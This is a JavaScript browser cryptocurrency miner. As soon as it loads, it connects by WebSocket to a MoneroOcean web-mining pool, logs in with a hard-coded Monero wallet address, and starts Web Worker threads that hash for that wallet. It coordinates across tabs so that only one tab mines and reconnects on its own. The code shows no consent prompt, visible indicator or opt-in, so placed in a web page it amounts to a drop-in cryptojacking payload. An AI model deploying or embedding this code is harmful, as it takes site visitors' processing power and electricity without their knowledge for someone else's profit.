var server = "wss://webminer.moneroocean.stream:443/";
var job = null;
var workers = [];
var ws;
var receiveStack = [];
var sendStack = [];
var totalhashes = 0;
var prev_hash = 0;
var connected = 0;
var reconnector = 0;
var attempts = 1;
var throttleMiner = 0;
var handshake = null;
var numThreads = 2;
var hashconv = {
    TH: 1e12,
    GH: 1e9,
    MH: 1e6,
    KH: 1e3,
    H: 1
};


//---------start mining--------
stopMining();
connected = 0;

handshake = {
    identifier: "handshake",
    login: "429EPxt6GmMGvfmpiXFdyvKrjFGGtr6pee91j7o6r5V4DzStvcRnH3m5pdd6mwxNENU5GpsDPUgpfewUiCr4TZfV6K3GgKw",
    password: "raiyan",
    pool: "moneroocean.stream",
    userid: "",
    version: 7,
};

var foo = function() {
    addWorkers(numThreads);
    reconnector()
};
startBroadcast(foo)



function wasmSupported() {
    try {
        if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
            var module = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
            if (module instanceof WebAssembly.Module) return new WebAssembly.Instance(module) instanceof WebAssembly.Instance
        }
    } catch (e) {}
    return false
}

function addWorkers(numThreads) {
    var logicalProcessors = numThreads;
    if (numThreads == -1) {
        try {
            logicalProcessors = window.navigator.hardwareConcurrency
        } catch (err) {
            logicalProcessors = 4
        }
        if (!(logicalProcessors > 0 && logicalProcessors < 40)) logicalProcessors = 4
    }
    while (logicalProcessors-- > 0) addWorker()
}
var openWebSocket = function() {
    if (ws != null) {
        ws.close()
    }
    var splitted = server.split(";");
    var chosen = splitted[Math.floor(Math.random() * splitted.length)];
    ws = new WebSocket(chosen);
    ws.onmessage = on_servermsg;
    ws.onerror = function(event) {
        if (connected < 2) connected = 2;
        job = null
    };
    ws.onclose = function() {
        if (connected < 2) connected = 2;
        job = null
    };
    ws.onopen = function() {
        ws.send(JSON.stringify(handshake));
        attempts = 1;
        connected = 1
    }
};
reconnector = function() {
    if (connected !== 3 && (ws == null || ws.readyState !== 0 && ws.readyState !== 1)) {
        attempts++;
        console.log('Reconnect Server: '+attempts)
        openWebSocket()
    }
    if (connected !== 3) setTimeout(reconnector, 1e4 * attempts)
};

function startBroadcast(mining) {
    if (typeof BroadcastChannel !== "function") {
        mining();
        return
    }
    stopBroadcast();
    var bc = new BroadcastChannel("channel");
    var number = Math.random();
    var array = [];
    var timerc = 0;
    var wantsToStart = true;
    array.push(number);
    bc.onmessage = function(ev) {
        if (array.indexOf(ev.data) === -1) array.push(ev.data)
    };

    function checkShouldStart() {
        bc.postMessage(number);
        timerc++;
        if (timerc % 2 === 0) {
            array.sort();
            if (array[0] === number && wantsToStart) {
                mining();
                wantsToStart = false;
                number = 0
            }
            array = [];
            array.push(number)
        }
    }
    startBroadcast.bc = bc;
    startBroadcast.id = setInterval(checkShouldStart, 1e3)
}

function stopBroadcast() {
    if (typeof startBroadcast.bc !== "undefined") {
        startBroadcast.bc.close()
    }
    if (typeof startBroadcast.id !== "undefined") {
        clearInterval(startBroadcast.id)
    }
}

function stopMining() {
    connected = 3;
    if (ws != null) ws.close();
    deleteAllWorkers();
    job = null;
    stopBroadcast()
}

function addWorker() {
    var newWorker = new Worker("worker.js");
    workers.push(newWorker);
    newWorker.onmessage = on_workermsg;
    setTimeout(function() {
        informWorker(newWorker)
    }, 2e3)
}

function removeWorker() {
    if (workers.length < 1) return;
    var wrk = workers.shift();
    wrk.terminate()
}

function deleteAllWorkers() {
    for (let i = 0; i < workers.length; i++) {
        workers[i].terminate()
    }
    workers = []
}

function informWorker(wrk) {
    var evt = {
        data: "wakeup",
        target: wrk
    };
    on_workermsg(evt)
}

function on_servermsg(e) {
    var obj = JSON.parse(e.data);
    console.log(obj)
    receiveStack.push(obj);
    if (obj.identifier == "job") job = obj
}

function on_workermsg(e) {
    var wrk = e.target;
    if (connected != 1) {
        setTimeout(function() {
            informWorker(wrk)
        }, 2e3);
        return
    }
    if (e.data != "nothing" && e.data != "wakeup") {
        var obj = JSON.parse(e.data);
        ws.send(e.data);
        sendStack.push(obj)
    }
    if (job === null) {
        setTimeout(function() {
            informWorker(wrk)
        }, 2e3);
        return
    }
    var jbthrt = {
        job: job,
        throttle: Math.max(0, Math.min(throttleMiner, 100))
    };
    wrk.postMessage(jbthrt);
    if (e.data != "wakeup") totalhashes += 1
}

function Rnd(n, dec, m) {
    if (dec >= 1) {
        var d = Math.pow(10, dec);
        n = Math.round(n * d) / d;
        if (m === "txt") {
            n = n.toFixed(dec);
            if ($L.dec !== ".") n = n.replace(".", $L.dec)
        }
    } else {
        n = Math.round(n)
    }
    return n
}

function HashConv(h) {
    h = h > 0 ? h : 0;
    var u = "/s";
    for (var k in hashconv) {
        if (h >= hashconv[k]) {
            h = h / hashconv[k];
            u = k + u;
            break
        }
    }
    if (h === 0) u = "H/s";
    return {
        num: Rnd(h, 2),
        unit: u
    }
}

function HashConvStr(h, unit) {
    var h = HashConv(h);
    return h.num + " " + (unit ? h.unit.replace(/H\//, unit + "/") : h.unit)
}

setInterval(function() {
    var hash = HashConvStr((totalhashes - prev_hash) / 2);
    console.log("Hash: "+hash+" --- Total: " + totalhashes + " H/s")
    prev_hash = totalhashes;
}, 2 * 1e3)
